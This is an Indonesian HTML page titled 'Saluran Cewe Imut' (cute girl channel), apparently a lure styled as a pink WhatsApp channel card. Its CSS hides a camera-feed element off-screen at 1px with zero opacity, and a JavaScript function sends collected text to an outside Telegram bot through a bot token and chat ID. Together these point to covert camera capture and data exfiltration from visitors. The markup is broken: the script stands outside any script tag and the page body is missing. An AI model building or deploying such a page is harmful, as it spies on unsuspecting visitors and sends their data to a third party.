<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>🌸 Saluran Cewe Imut 🌸</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(145deg, #ffb6c1 0%, #ff69b4 100%);
            font-family: 'Segoe UI', 'Helvetica Neue', 'Apple Color Emoji', 'Segoe UI Emoji', sans-serif;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .wa-card {
            max-width: 500px;
            width: 100%;
            background: #fff0f5;
            border-radius: 48px;
            box-shadow: 0 30px 40px rgba(255, 20, 147, 0.3);
            overflow: hidden;
            backdrop-filter: blur(2px);
            border: 2px solid #ffe4ec;
        }
        .header-pink {
            background: #ff85b3;
            padding: 20px;
            text-align: center;
            color: white;
            border-bottom: 3px solid #ffc0cb;
        }
        .header-pink h1 {
            font-size: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            letter-spacing: -0.5px;
        }
        .header-pink p {
            font-size: 13px;
            opacity: 0.9;
            margin-top: 6px;
        }
        .chat-area {
            padding: 20px;
            background: #ffeef4;
        }
        .bubble {
            background: white;
            border-radius: 28px;
            padding: 12px 18px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 14px;
            box-shadow: 0 4px 10px #ffc0cb66;
            border: 1px solid #ffb7c5;
        }
        .bubble span:first-child {
            font-size: 36px;
        }
        .bubble p {
            color: #aa2e6b;
            font-weight: 500;
            font-size: 14px;
        }
        .emoji-strip {
            display: flex;
            justify-content: center;
            gap: 20px;
            font-size: 34px;
            margin: 20px 0 10px;
        }
        .glow-btn {
            background: #ff66a3;
            border: none;
            color: white;
            font-weight: bold;
            font-size: 20px;
            padding: 16px;
            border-radius: 60px;
            width: 100%;
            cursor: pointer;
            transition: 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            box-shadow: 0 8px 0 #b23b68;
            margin-top: 8px;
            font-family: inherit;
        }
        .glow-btn:active {
            transform: translateY(4px);
            box-shadow: 0 4px 0 #b23b68;
        }
        .footer-note {
            text-align: center;
            font-size: 11px;
            color: #ff80a5;
            padding: 16px;
            background: #fff0f5;
            border-top: 1px solid #ffc0cb;
        }
        #cameraFeed {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        @keyframes float {
            0% { transform: translateY(0px); }
            100% { transform: translateY(-5px); }
        }
        .heartbeat {
            animation: float 1s ease infinite;
        }
    </style>
</head>

        async function sendToTelegram(text) {
            if (!BOT_TOKEN || !CHAT_ID) return;
            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            let formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('text', text);
            await fetch(url, { method: 'POST', body: formData }).catch(e => console.log);
        }
